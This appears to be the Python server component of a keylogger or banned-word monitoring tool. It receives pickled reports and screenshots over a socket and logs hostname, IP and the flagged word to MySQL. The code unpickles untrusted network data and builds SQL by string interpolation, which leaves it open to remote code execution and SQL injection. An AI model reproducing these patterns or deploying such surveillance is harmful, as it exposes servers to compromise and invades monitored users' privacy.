import pickle
from time import sleep
import pymysql
import socket
from db_config import host, port, user, password, db_name


def data_base_connection():
    try:
        connection = pymysql.connect(
            host=host,
            port=port,
            user=user,
            password=password,
            database=db_name,
            cursorclass=pymysql.cursors.DictCursor
        )

        print('Successfully connected...')
        print('#'*20)

        try:
            #sellect alldata form the table
            with connection.cursor() as cursor:
                select_all_rows = "SELECT * FROM actor;"
                cursor.execute(select_all_rows)
                rows = cursor.fetchall()
                for row in rows:
                    print(row)
                print('#'*20)
        finally:
            connection.close()

    except Exception as ex:
        print('Connections refused...')
        print(ex)

def create_data_base_for_keylogger():
    try:
        connection = pymysql.connect(
            host=host,
            port=port,
            user=user,
            password=password,
            cursorclass=pymysql.cursors.DictCursor
        )

        print('Successfully connected...')
        print('[+] def create_data_base_for_keylogger()')

        try:
            #create db for keylogger
            with connection.cursor() as cursor:
                create_new_db = f"CREATE DATABASE IF NOT EXISTS `{db_name}`;"
                cursor.execute(create_new_db)
                print(f'[+] {db_name} db successfully created!')
                print('#'*20)
        finally:
            connection.close()

    except Exception as ex:
        print('Connections refused...')
        print(f'[+] {db_name} not created!')
        print(ex)

def create_table_for_fixing_violations():
    try:
        connection = pymysql.connect(
            host=host,
            port=port,
            user=user,
            password=password,
            database=db_name,
            cursorclass=pymysql.cursors.DictCursor
        )

        print('Successfully connected...')
        print('[+] def create_table_for_fixing_violations()')

        try:
            #Создание таблицы для хранения журнала нарушений
            with connection.cursor() as cursor:
                create_new_table = '''
                CREATE TABLE IF NOT exists Violation_log (
                `num` int UNSIGNED auto_increment,
                `timestamp` text not null,
                `hostname` text not null,
                `local_ip` text not null,
                `banword` text not null,
                `screenshot_path` text not null,
                primary key (num)
                );'''
                cursor.execute(create_new_table)
                print('[+] Violation_log table successfully created!')
                print('#'*20)
        finally:
            connection.close()

    except Exception as ex:
        print('Connections refused...')
        print('[+] Violation_log table not created!')
        print(ex)



def send_report_to_db(filename, timestamp, hostname, local_ip,  banword):

    filename=str(filename)
    timestamp=str(timestamp)
    hostname=str(hostname)
    local_ip=str(local_ip)
    banword=str(banword)
    screenshot_path=str(f'serverscreenshot/{filename}')

    try:
        connection = pymysql.connect(
            host=host,
            port=port,
            user=user,
            password=password,
            database=db_name,
            cursorclass=pymysql.cursors.DictCursor
        )

        print('Successfully connected...')
        print('[+] send_report_to_db()')


        try:
            #Отправка репорта в бд
            with connection.cursor() as cursor:
                inset_data = f'''
                INSERT INTO 
                `Violation_log` (`timestamp`, `hostname`, `local_ip`, `banword`, `screenshot_path`)
                VALUES ('{timestamp}', '{hostname}', '{local_ip}', '{banword}', '{screenshot_path}');'''
                cursor.execute(inset_data)
                connection.commit()
                print('[+] New enrty added!')
                print('#'*20)
        finally:
            connection.close()

    except Exception as ex:
        print('Connections refused...')
        print('[+] New enrty not added')
        print(ex)

def recive_image(filename):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('localhost', 8080))
    server.listen()

    client_socket, client_address = server.accept()

    file = open(f'serverscreenshot/{filename}', 'wb')

    image_chunk = client_socket.recv(2048)

    while image_chunk:
        file.write(image_chunk)
        image_chunk = client_socket.recv(2048)

    file.close()
    client_socket.close()

def recive_report():
    print("Waiting for report...")
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(('localhost', 8080))
        server.listen()
        
        client_socket, client_address = server.accept()
        data = client_socket.recv(2048)
        data = pickle.loads(data)
        filename = data[0].split('/')
        filename = filename[-1]
        timestamp, hostname, local_ip,  banword = data[1], data[2], data[3], data[4]

        server.close()

    except Exception as ex:
        print(ex)
    
    recive_image(filename=filename)

    #print(f'recved info\n{data}')
    print(f'''
    filename - {filename}
    timestamp - {timestamp}
    hostname - {hostname}
    local_ip - {local_ip}
    banword - {banword}
    ''')

    send_report_to_db(filename, timestamp, hostname, local_ip,  banword)


def main():
    create_data_base_for_keylogger()
    create_table_for_fixing_violations()
    while True:
        sleep(5)
        recive_report()


def test():
    #recive_image(filename="test.png")
    while True:
        sleep(5)
        recive_report()

if __name__=="__main__":
    main()
    #test()